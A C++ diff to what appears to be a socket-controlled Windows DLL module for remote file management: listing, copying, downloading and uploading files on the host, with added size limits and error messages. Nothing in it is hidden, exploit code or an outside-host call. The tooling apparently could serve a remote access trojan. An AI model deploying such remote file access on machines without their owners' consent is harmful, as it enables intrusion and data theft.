@@ -183,10 +183,12 @@ static void send_files(SOCKET sock, wstring path) {
             if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                 item["type"] = "Folder";
                 item["size"] = "";
+                item["size_raw"] = 0;
             } else {
                 item["type"] = "File";
                 uint64_t size = ((uint64_t)findData.nFileSizeHigh << 32) | findData.nFileSizeLow;
                 item["size"] = format_size(size);
+                item["size_raw"] = size;
             }
             files.push_back(item);
         } while (FindNextFileW(hFind, &findData));
@@ -294,11 +296,11 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* com
         }
         else if (action == "pastefile") {
             if (clipboard_path.empty()) {
-                send_log(sock, "Clipboard is empty");
+                send_log(sock, "Paste failed: Clipboard is empty");
                 return;
             }
             wstring dest_dir = utf8_to_wide(command.value("path", ""));
-            if (dest_dir.back() != L'\\') dest_dir += L"\\";
+            if (!dest_dir.empty() && dest_dir.back() != L'\\') dest_dir += L"\\";
             size_t last_slash = clipboard_path.find_last_of(L"\\");
             wstring filename = (last_slash != wstring::npos) ? clipboard_path.substr(last_slash + 1) : clipboard_path;
             wstring dest_path = dest_dir + filename;
@@ -313,7 +315,7 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* com
             wstring path = utf8_to_wide(command.value("path", ""));
             FILE* f = _wfopen(path.c_str(), L"rb");
             if (!f) {
-                send_log(sock, "Download failed: Could not open file");
+                send_log(sock, "Download failed: Could not open file [" + get_last_error_message(GetLastError()) + "]");
                 return;
             }
             fseek(f, 0, SEEK_END);
@@ -340,10 +342,22 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* com
         else if (action == "uploadfile") {
             wstring path = utf8_to_wide(command.value("path", ""));
             string base64_data = command.value("data", "");
+
+            // Basic size check on base64 string (slightly more than 50MB due to encoding overhead)
+            if (base64_data.length() > (70 * 1024 * 1024)) {
+                send_log(sock, "Upload failed: Received data is too large");
+                return;
+            }
+
             vector<uint8_t> data = base64_decode(base64_data);
+            if (data.size() > (50 * 1024 * 1024)) {
+                send_log(sock, "Upload failed: Decoded file exceeds 50MB limit");
+                return;
+            }
+
             FILE* f = _wfopen(path.c_str(), L"wb");
             if (!f) {
-                send_log(sock, "Upload failed: Could not create file");
+                send_log(sock, "Upload failed: Could not create file [" + get_last_error_message(GetLastError()) + "]");
                 return;
             }
             fwrite(data.data(), 1, data.size(), f);
